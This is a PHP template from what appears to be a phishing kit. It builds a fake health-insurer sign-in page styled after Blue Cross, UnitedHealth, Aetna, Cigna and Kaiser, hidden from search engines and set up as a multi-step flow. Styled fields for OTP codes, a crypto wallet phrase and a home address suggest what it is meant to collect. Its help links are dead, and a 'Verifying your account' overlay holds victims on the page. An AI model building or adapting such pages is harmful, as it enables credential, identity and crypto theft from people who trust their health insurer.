<?php
// Healthcare template — Blue Cross / UnitedHealth / Aetna / Cigna / Kaiser style
// Clean clinical white, soft blues/greens, cross icon, reassuring tone
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Member Portal</title>
<meta name="robots" content="noindex,nofollow">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--a:<?=$accent?>;--s:<?=$sec?>;--r:<?=$ar?>;--g:<?=$ag?>;--b:<?=$ab?>}
body{font-family:'Inter',system-ui,sans-serif;min-height:100vh;min-height:100dvh;
  background:#eef4fb;display:flex;flex-direction:column;align-items:center;
  justify-content:center;padding:20px 16px;color:#1a3050}

/* Card */
.card{width:100%;max-width:450px;background:#fff;border-radius:12px;overflow:hidden;
  box-shadow:0 4px 24px rgba(0,0,0,.1),0 1px 4px rgba(0,0,0,.06)}

/* Header */
.hd{background:<?=$accent?>;padding:22px 28px 18px;position:relative;overflow:hidden}
.hd::before{content:'';position:absolute;right:-30px;top:-30px;width:140px;height:140px;
  border-radius:50%;background:rgba(255,255,255,.07);pointer-events:none}
.hd-row{display:flex;align-items:center;gap:14px;position:relative;z-index:1}
.logo-box{width:54px;height:54px;background:<?=$logo_bg?>;border-radius:12px;
  display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0;
  box-shadow:0 3px 14px rgba(0,0,0,.18)}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:18px;font-weight:800;color:<?=$accent?>}
.hd-name{font-size:17px;font-weight:700;color:#fff;line-height:1.2}
.hd-sub{font-size:11px;color:rgba(255,255,255,.72);margin-top:3px}

/* Health notice bar */
.notice-bar{background:#f0f7ff;border-bottom:1px solid #dbeafe;
  padding:9px 28px;display:flex;align-items:center;gap:8px}
.notice-icon{font-size:14px;flex-shrink:0}
.notice-text{font-size:11px;color:#1e40af;font-weight:500;line-height:1.4}

/* Step progress */
.progress-wrap{padding:14px 28px 0;border-bottom:1px solid #f0f4f8}
.progress-steps{display:flex;align-items:center;margin-bottom:12px}
.ps-item{flex:1;display:flex;flex-direction:column;align-items:center;position:relative}
.ps-item:not(:last-child)::after{content:'';position:absolute;left:50%;top:10px;
  width:100%;height:2px;background:#e2e8f0;z-index:0}
.ps-circle{width:20px;height:20px;border-radius:50%;background:#e2e8f0;
  color:#9ca3af;font-size:10px;font-weight:700;
  display:flex;align-items:center;justify-content:center;
  position:relative;z-index:1;transition:all .2s;border:2px solid #fff}
.ps-item.active .ps-circle{background:<?=$accent?>;color:#fff;border-color:<?=$accent?>}
.ps-item.done .ps-circle{background:#10b981;color:#fff;border-color:#10b981}
.ps-label{font-size:8px;color:#9ca3af;margin-top:4px;text-align:center;
  text-transform:uppercase;letter-spacing:.3px;line-height:1.3}
.ps-item.active .ps-label{color:<?=$accent?>;font-weight:700}
.ps-item.done .ps-label{color:#10b981;font-weight:700}

/* Body */
.bd{padding:22px 28px 20px}
.step-title{font-size:18px;font-weight:700;color:#1a3050;margin-bottom:4px;line-height:1.3}
.step-sub{font-size:13px;color:#6b7280;margin-bottom:18px;line-height:1.5}

/* Fields */
.field{margin-bottom:15px}
.field label{display:block;font-size:12px;font-weight:600;color:#374151;margin-bottom:6px;letter-spacing:.1px}
.field input{width:100%;background:#f8fafc;border:1.5px solid #e2e8f0;color:#1a3050;
  padding:12px 14px;border-radius:8px;font-size:15px;outline:none;
  font-family:inherit;-webkit-appearance:none;transition:border-color .15s,box-shadow .15s}
.field input:focus{border-color:<?=$accent?>;
  box-shadow:0 0 0 3px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.10);background:#fff}
.field input::placeholder{color:#c4c8d0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.or-div{text-align:center;font-size:12px;color:#9ca3af;margin:12px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:43%;height:1px;background:#e2e8f0}
.or-div::before{left:0}.or-div::after{right:0}

/* Button */
.btn{width:100%;padding:14px;background:<?=$accent?>;color:#fff;font-size:15px;font-weight:700;
  border:none;border-radius:8px;cursor:pointer;margin-top:6px;
  transition:filter .15s;position:relative;font-family:inherit}
.btn:hover{filter:brightness(.92)}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:16px;height:16px;
  border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;
  transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:13px;color:#dc2626;margin-top:8px;display:none}

/* Links */
.forgot-link{display:block;text-align:center;margin-top:12px;font-size:13px;
  color:<?=$accent?>;text-decoration:none}
.forgot-link:hover{text-decoration:underline}
.new-member{text-align:center;margin-top:14px;padding-top:14px;border-top:1px solid #f0f4f8;
  font-size:13px;color:#6b7280}
.new-member a{color:<?=$accent?>;text-decoration:none;font-weight:600}
.new-member a:hover{text-decoration:underline}

/* OTP / wallet */
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:22px;font-weight:700;padding:12px 4px;max-width:48px;
  background:#f8fafc;border:1.5px solid #e2e8f0;border-radius:8px;color:#1a3050;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:12px;color:#9ca3af;text-align:center;margin-top:8px}
.wallet-area{width:100%;min-height:80px;background:#f8fafc;border:1.5px solid #e2e8f0;color:#1a3050;
  padding:12px 14px;border-radius:8px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:#9ca3af;margin-top:6px;line-height:1.5;text-align:center}
.addr-area{width:100%;min-height:60px;background:#f8fafc;border:1.5px solid #e2e8f0;color:#1a3050;
  padding:12px 14px;border-radius:8px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}

/* Footer */
.card-footer{padding:14px 28px;border-top:1px solid #f0f4f8;font-size:11px;color:#9ca3af;
  text-align:center;line-height:1.7}
.card-footer a{color:#9ca3af;text-decoration:none}
.card-footer a:hover{text-decoration:underline}

#loadOverlay{display:none;position:fixed;inset:0;background:rgba(238,244,251,.9);z-index:999;
  align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:40px;height:40px;border:3px solid #e2e8f0;border-top-color:<?=$accent?>;
  border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:#9ca3af}

@media(max-width:480px){
  .card{border-radius:0;min-height:100vh;min-height:100dvh;
    box-shadow:none;width:100%;max-width:100%}
  .bd{padding:20px 20px 18px}
  .card-footer{padding:12px 20px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying your account…</div></div>

<div class="card">
  <div class="hd">
    <div class="hd-row">
      <div class="logo-box">
        <?php if($logo_url): ?>
        <img src="<?=htmlspecialchars($logo_url)?>" alt="<?=htmlspecialchars($org_name)?>" onerror="this.style.display='none';this.nextElementSibling.style.display='block'">
        <div class="logo-ini" style="display:none"><?=strtoupper(substr($org_name,0,2))?></div>
        <?php else: ?>
        <div class="logo-ini"><?=strtoupper(substr($org_name,0,2))?></div>
        <?php endif; ?>
      </div>
      <div>
        <div class="hd-name"><?=htmlspecialchars($org_name)?></div>
        <div class="hd-sub">Member Portal — Secure Sign In</div>
      </div>
    </div>
  </div>

  <!-- Notice bar -->
  <div class="notice-bar">
    <div class="notice-icon">🏥</div>
    <div class="notice-text">Access your benefits, claims, and health records securely</div>
  </div>

  <!-- Step progress -->
  <?php if($total_steps > 1): ?>
  <div class="progress-wrap">
    <div class="progress-steps" id="psWrap">
      <?php
      $ps_labels = ['Sign In','Verify','Confirm','Complete'];
      for($i=1;$i<=$total_steps;$i++): ?>
      <div class="ps-item <?=$i===1?'active':''?>" id="psi<?=$i?>">
        <div class="ps-circle" id="psc<?=$i?>"><?=$i?></div>
        <div class="ps-label"><?=$ps_labels[$i-1] ?? 'Step '.$i?></div>
      </div>
      <?php endfor; ?>
    </div>
  </div>
  <?php endif; ?>

  <div class="bd">
    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <?php if(!empty($sc['step_subs'][$sn])): ?>
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <?php endif; ?>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <?php if($sn===1): ?>
      <a href="#" class="forgot-link" onclick="return false">Forgot Member ID or password?</a>
      <div class="new-member">New member? <a href="#" onclick="return false">Activate your account</a></div>
      <?php endif; ?>
    </div>
    <?php endfor; ?>
  </div>

  <div class="card-footer">
    <?=$footer?><br>
    <a href="#">Privacy</a> &nbsp;·&nbsp; <a href="#">Terms</a> &nbsp;·&nbsp; <a href="#">Help</a> &nbsp;·&nbsp; <a href="#">1-800-MEMBER</a>
  </div>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
<script>
// Update step progress circles
const _origShowStepHc = showStep;
function showStep(n) {
  _origShowStepHc(n);
  for(let i=1;i<=TOTAL_STEPS;i++){
    const psi=document.getElementById('psi'+i);
    const psc=document.getElementById('psc'+i);
    if(!psi) continue;
    psi.classList.remove('active','done');
    if(i===n){psi.classList.add('active');psc.textContent=i;}
    else if(i<n){psi.classList.add('done');psc.textContent='✓';}
    else psc.textContent=i;
  }
}
</script>
</body>
</html>
